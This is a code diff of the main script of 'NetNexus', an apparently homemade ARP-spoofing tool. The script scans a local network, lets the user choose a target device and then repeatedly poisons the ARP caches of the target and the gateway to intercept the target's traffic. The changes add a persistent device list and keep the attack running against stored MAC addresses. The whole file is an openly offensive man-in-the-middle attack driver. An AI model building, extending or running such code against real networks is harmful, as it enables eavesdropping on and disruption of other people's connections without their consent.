@@ -5,73 +5,62 @@ import sys
 from core import scanner, spoof
 
 def main():
-    # CONFIGURATION: Set your Arch interface (check 'ip a')
-    scapy.conf.iface = "wlan0" 
+    scapy.conf.iface = "wlan0" # Verify with 'ip a'
     
     if os.geteuid() != 0:
-        print("[-] NetNexus requires root. Run with: sudo python main.py")
+        print("[-] NetNexus requires root.")
         return
 
     gateway_ip = "192.168.8.1"
     ip_range = "192.168.8.1/24"
+    device_memory = {} # Persistent list
 
     while True:
-        print("\n" + "="*45)
-        print("      NetNexus: Discovery & Control Center")
-        print("="*45)
-        print(f"[*] Scanning {ip_range}... please wait.")
+        print("\n" + "="*40)
+        print("      NetNexus: Persistent Mode")
+        print("="*40)
         
-        devices = scanner.scan(ip_range)
+        # Scan and update our memory
+        device_memory = scanner.scan(ip_range, device_memory)
         
-        print("\nID\tIP Address\t\tMAC Address\t\tDevice Name")
-        print("-" * 100)
-        for index, device in enumerate(devices):
-            print(f"{index}\t{device['ip']}\t\t{device['mac']}\t{device['name']}")
+        # Convert memory to a list for ID selection
+        current_list = list(device_memory.values())
         
-        print("-" * 100)
-        print("[R] Refresh/Rescan Network")
-        print("[C] Cancel and Exit")
+        print("\nID\tIP Address\t\tDevice Name")
+        print("-" * 60)
+        for index, dev in enumerate(current_list):
+            print(f"{index}\t{dev['ip']}\t\t{dev['name']}")
         
-        user_input = input("\nSelect Target ID or Option: ").lower().strip()
+        print("-" * 60)
+        print("[R] Refresh/Scan  [C] Exit")
+        
+        user_input = input("\nSelect ID: ").lower().strip()
 
-        if user_input == 'c':
-            print("[*] Exiting NetNexus.")
-            sys.exit()
-        elif user_input == 'r':
-            print("[*] Refreshing network map...")
-            continue
+        if user_input == 'c': sys.exit()
+        if user_input == 'r': continue
         
         try:
-            choice = int(user_input)
-            target = devices[choice]
+            target = current_list[int(user_input)]
             target_ip = target['ip']
             target_mac = target['mac']
 
-            print(f"[*] Resolving Gateway MAC...")
+            print(f"[*] Locking onto {target_ip} ({target_mac})...")
             gateway_mac, _ = spoof.get_device_info(gateway_ip)
 
-            if not gateway_mac:
-                print("[-] Error: Could not find Gateway. Try refreshing [R].")
-                continue
-
-            print(f"[*] Attack Active: Intercepting {target_ip} ({target['name']})")
             packet_count = 0
             while True:
+                # We use the MAC address we found earlier, even if it "disappears"
                 spoof.spoof(target_ip, gateway_ip, target_mac, gateway_mac)
                 packet_count += 2
-                # Counter proves the script is running and not frozen
-                print(f"\r[+] Intercepting... Packets Sent: {packet_count} | Ctrl+C to Stop", end="") 
+                print(f"\r[+] Packets Sent: {packet_count} | Target: {target_ip}", end="") 
                 time.sleep(0.5)
                 
         except (ValueError, IndexError):
-            print("[-] Invalid choice. Use a number from the list, 'R', or 'C'.")
-            time.sleep(1)
+            print("[-] Invalid Selection.")
         except KeyboardInterrupt:
-            print("\n\n[*] Stopping Attack... Restoring network for target.")
+            print("\n[*] Restoring...")
             spoof.restore(target_ip, gateway_ip)
             spoof.restore(gateway_ip, target_ip)
-            print("[+] Network Restored. Returning to Menu...")
-            time.sleep(1.5)
 
 if __name__ == "__main__":
     main()
